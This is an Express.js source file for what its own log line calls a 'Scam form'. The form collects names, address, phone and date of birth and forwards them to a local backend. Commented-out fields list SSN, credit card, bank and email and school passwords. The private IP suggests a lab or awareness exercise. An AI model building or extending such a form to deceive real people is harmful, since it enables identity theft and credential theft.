console.log("front-end is running");

import express from 'express';

const port = 8080;
const app = express();

app.set('view engine', 'ejs');

app.use(express.json());
app.use(express.urlencoded({extended: true}));
app.use(express.static('public'));

app.get("/", (req, res) => {
    res.render('home');
});

app.get("/form", (req, res) => {
    console.log("Scam form has been requested");
    let model = {
        fname: '',
        lname: '',
        addr: '',
        phone: '',
//        email: '',
        dob: '',
//        schemail: '',
//        ccn: '',
//        bank: '',
//        ssn: '',
//        empass: '',
//        schpass: ''
    };
    res.render("form", model)
})

app.post("/form", async (req, res) => {
    console.log("Form submitted")
    console.log("Form Data: ", req.body)

    let dataIsValid = false;
    let userData = req.body;

    let namePattern = /\S{2,}/;
    let fnameIsValid = namePattern.test(userData.firstname);
    let lnameIsValid = namePattern.test(userData.lastname);

    let phonePattern = /[0-9 ()-]{10,20}/;
    let phoneIsValid = phonePattern.test(userData.phonenumber);

    let addressPattern = /\S{1,} \S{1,}/;
    let addressIsValid = addressPattern.test(userData.address);

    let dobPattern = /\S{2,}/;
    let dobIsValid = dobPattern.test(userData.dob);

    dataIsValid = fnameIsValid && lnameIsValid && phoneIsValid && addressIsValid && dobIsValid

    if (dataIsValid) {
        let formData = {
            firstname: userData.firstname,
            lastname: userData.lastname,
            phonenumber: userData.phonenumber,
            address: userData.address,
            dob: userData.dob
        };

        let username = `${userData.firstname}${userData.lastname}`;

        console.log(username, formData);

        let url = "http://localhost:3000/createuser";

        let options = {
            method: "POST",
            headers: {
                "content-type": "application/json"
            },
            body: JSON.stringify(formData)
        }

        let p1 = await fetch(url, options);

        res.redirect("/");
    }else{
        let model = req.body;
        res.render("form", model)
    }
});

app.listen(port, '10.0.103.20', () => {
    console.log(`Server running at http://10.0.103.20:${port}/`)
})